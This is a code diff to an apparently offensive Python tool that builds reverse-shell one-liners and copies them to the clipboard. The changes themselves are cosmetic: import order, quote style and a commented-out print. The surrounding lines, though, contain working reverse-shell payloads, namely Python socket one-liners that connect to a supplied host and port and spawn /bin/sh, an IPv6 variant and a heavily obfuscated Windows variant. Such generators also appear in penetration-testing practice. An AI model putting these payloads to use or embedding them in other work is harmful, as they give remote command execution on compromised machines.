@@ -1,5 +1,5 @@
-from simple_term_menu import TerminalMenu
 import pyperclip
+from simple_term_menu import TerminalMenu
 
 languages = {
     "python": ["python", "py", "py3"],
@@ -36,9 +36,9 @@ def lang_handler(lang, option):
 def python(option=""):
 
     python_rs = [
-        r'''export RHOST="{}";export RPORT={};python -c \'import socket,os,pty;s=
+        r"""export RHOST="{}";export RPORT={};python -c \'import socket,os,pty;s=
         socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[
-        os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\'''',
+        os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\'""",
         r"""C:\Python27\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[
         (s.connect(('{}', {})), [[[(s2p_thread.start(), [[(p2s_thr
         ead.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__
@@ -66,8 +66,8 @@ def python(option=""):
           g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading']
            in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y
            : f(lambda: y(y)()))), globals(), __import__('contextlib'))\"""",
-        '''python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);
-        s.connect(("{}",{},0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'''',
+        """python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);
+        s.connect(("{}",{},0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'""",
     ]
 
     if option is True:
@@ -126,5 +126,5 @@ def ruby(option=""):
 
 # This function will put the reverse shell into the clipboard of the system.
 def provide_rs(rs, ip, port):
-    print("Reverse Shell is now in clipboard.")
+    # print("Reverse Shell is now in clipboard.")
     pyperclip.copy(f"{rs.format(ip,port)}")
